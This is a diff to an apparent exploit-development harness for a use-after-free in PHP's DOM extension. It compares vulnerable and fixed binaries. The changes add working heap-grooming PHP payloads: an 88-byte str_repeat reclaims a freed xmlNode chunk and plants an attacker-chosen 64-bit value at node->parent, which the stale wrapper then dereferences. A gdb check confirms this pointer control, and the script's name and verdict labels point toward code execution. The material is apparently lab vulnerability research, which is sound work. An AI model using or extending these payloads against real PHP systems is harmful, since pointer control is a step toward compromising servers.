@@ -20,11 +20,17 @@ Scenarios (all fix-sensitive A/B):
   p3  write through the stale wrapper corrupts the NEW node (cross-object write);
   p4  reparenting the new node steers the stale wrapper's parentNode;
   p5  empty replacement + normalizeDocument() frees the reused node; the stale
-      wrapper's destructor then double-frees it -> glibc abort (rc 134).
-  p6  groom negative: 12 same-size (120 B) zend_strings never land chosen bytes
-      at the stale wrapper's read offsets; no arbitrary pointer control.
+      wrapper's destructor then double-frees it -> glibc abort.
+  p6  POINTER CONTROL: 88-byte str_repeat (zend_string_safe_falloc allocates
+      len+32 = 120 B = 0x80 chunk, same as xmlNode) puts chosen bytes at chunk
+      offset 40 (node->parent); the stale wrapper dereferences exactly that
+      chosen 64-bit value in php_dom_object_get_data (php_dom.c:324).
+  p7  size calibration negative: 89-byte str_repeat allocates 121 B (0x88),
+      a different bin; the chosen bytes never reach node->parent.
 
-p1-p4 use the default allocator; p5/p6 require USE_ZEND_ALLOC=0.
+p1-p4 use the default allocator; p5/p6/p7 require USE_ZEND_ALLOC=0.
+GDB_BIN env (default /usr/bin/gdb) makes the harness verify that the chosen
+pointer value actually appears in the fault backtrace.
 No network, no non-loopback access.
 
 Usage: python3 php2shell-dom-reflected-attr-groom.py VULN_BIN FIXED_BIN [OUTDIR]
@@ -88,20 +94,32 @@ var_dump($p === null);
 echo "SURVIVED\n";
 """
 
-P6 = r"""<?php
-// Groom negative: chosen bytes at string indices 16..23 (= chunk offset 40,
-// node->parent) of 120-B zend_strings. They never occupy the stale chunk.
+P6_TEMPLATE = r"""<?php
+// POINTER CONTROL: 88-byte str_repeat allocates 88+32 = 120 B (0x80 chunk).
+// val[] begins at chunk offset 24, so string indices 16..23 are node->parent
+// at chunk offset 40 of the freed xmlNode reused by this string.
 $doc = new DOMDocument(); $doc->loadXML('<root class="old"/>');
 $root = $doc->documentElement;
 $text = $root->getAttributeNode('class')->firstChild;
 $root->className = '';
 $doc->normalizeDocument();
-$strs = [];
-for ($j = 0; $j < 12; $j++) {
-    $s = str_repeat('A', 89);
-    for ($i = 0; $i < 8; $i++) { $s[16 + $i] = chr(0x42); }
-    $strs[] = $s;
-}
+$s = str_repeat('A', 88);
+for ($i = 0; $i < 8; $i++) { $s[16 + $i] = chr(BYTE); }
+echo "READY\n";
+$p = $text->parentNode;   // dereferences the chosen 64-bit value as a pointer
+echo "SURVIVED\n";
+"""
+
+P7 = r"""<?php
+// Size calibration NEGATIVE: 89-byte str_repeat allocates 121 B (0x88 bin),
+// a different glibc size class from the freed 120-B xmlNode (0x80).
+$doc = new DOMDocument(); $doc->loadXML('<root class="old"/>');
+$root = $doc->documentElement;
+$text = $root->getAttributeNode('class')->firstChild;
+$root->className = '';
+$doc->normalizeDocument();
+$s = str_repeat('A', 89);
+for ($i = 0; $i < 8; $i++) { $s[16 + $i] = chr(0x42); }
 echo "READY\n";
 $p = $text->parentNode;
 var_dump($p === null);
@@ -114,7 +132,8 @@ SCENARIOS = [
     ("p3", P3, False),
     ("p4", P4, False),
     ("p5", P5, True),
-    ("p6", P6, True),
+    ("p6", P6_TEMPLATE.replace("BYTE", "0x42"), True),
+    ("p7", P7, True),
 ]
 
 
@@ -131,6 +150,16 @@ def run(binary, script, path, log, zend_off):
     return cp.returncode, log.read_text(errors="replace")
 
 
+def run_gdb(binary, script, path, log, gdb):
+    path.write_text(script)
+    env = dict(os.environ, USE_ZEND_ALLOC="0")
+    cmd = [str(gdb), "-q", "-batch", "-ex", "set pagination off", "-ex", "run",
+           "-ex", "bt 3", "--args", str(binary), "-n", str(path)]
+    with log.open("wb") as fh:
+        subprocess.run(cmd, stdout=fh, stderr=subprocess.STDOUT, timeout=120, env=env)
+    return log.read_text(errors="replace")
+
+
 def main():
     if len(sys.argv) < 3:
         print(__doc__)
@@ -139,6 +168,8 @@ def main():
     outdir = pathlib.Path(sys.argv[3]) if len(sys.argv) > 3 else pathlib.Path(
         "lab/build/evidence/w56-domattr-groom")
     outdir.mkdir(parents=True, exist_ok=True)
+    gdb = os.environ.get("GDB_BIN") or ("/usr/bin/gdb"
+          if pathlib.Path("/usr/bin/gdb").exists() else None)
     results = {}
     for label, script, zend_off in SCENARIOS:
         for name, binary in (("vuln", vuln), ("fixed", fixed)):
@@ -152,6 +183,15 @@ def main():
         f = results[(label, "fixed")]
         return needle_v in v[1] and needle_f in f[1]
 
+    # Confirm the chosen 64-bit value is consumed as the pointer, not just a crash.
+    gdb_text = ""
+    if gdb:
+        p6_script = dict((l, s) for l, s, _ in SCENARIOS)["p6"]
+        gdb_text = run_gdb(vuln, p6_script, outdir / "p6-gdb.php",
+                           outdir / "p6-gdb.log", gdb)
+    chosen = "0x4242424242424242"
+    ptr_ok = (chosen in gdb_text and "php_dom_object_get_data" in gdb_text)
+
     checks = {
         "p1_stale_reads_new": ok("p1", "detached: bool(false)", "detached: bool(true)"),
         "p2_chosen_bytes": ok("p2", "same: bool(true)", "same: bool(false)"),
@@ -162,18 +202,20 @@ def main():
             and "double free" in results[("p5", "vuln")][1]
             and results[("p5", "fixed")][0] == 0
         ),
-        "p6_no_pointer_control": (
-            "SURVIVED" in results[("p6", "vuln")][1]
-            and "bool(true)" in results[("p6", "vuln")][1]
+        "p6_pointer_control": (
+            results[("p6", "vuln")][0] != 0
+            and ptr_ok
             and results[("p6", "fixed")][0] == 0
+            and "SURVIVED" in results[("p6", "fixed")][1]
         ),
+        "p7_size_calibration_negative": ok("p7", "SURVIVED", "SURVIVED"),
     }
-    verdict = "CONFIRMED_FIX_SENSITIVE" if all(
-        v for k, v in checks.items() if k != "p6_no_pointer_control") else "INCONCLUSIVE"
+    verdict = "RUNG4_POINTER_CONTROL" if all(checks.values()) else "INCONCLUSIVE"
     (outdir / "verdict.txt").write_text(
-        f"verdict={verdict}\n" + "".join(f"{k}={v}\n" for k, v in checks.items()))
+        f"verdict={verdict}\nchosen_pointer={chosen}\n"
+        + "".join(f"{k}={v}\n" for k, v in checks.items()))
     print("VERDICT:", verdict)
-    return 0 if verdict == "CONFIRMED_FIX_SENSITIVE" else 1
+    return 0 if verdict == "RUNG4_POINTER_CONTROL" else 1
 
 
 if __name__ == "__main__":
